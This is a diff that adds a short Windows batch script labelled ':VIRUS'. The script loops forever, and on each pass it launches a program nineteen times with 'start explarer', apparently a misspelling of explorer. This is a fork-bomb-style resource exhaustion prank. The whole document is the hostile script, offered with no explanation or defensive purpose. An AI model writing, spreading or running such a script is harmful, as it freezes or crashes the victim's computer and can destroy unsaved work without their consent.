@@ -1,0 +1,22 @@
+@echo off
+:VIRUS
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+start explarer
+GOTO VIRUS
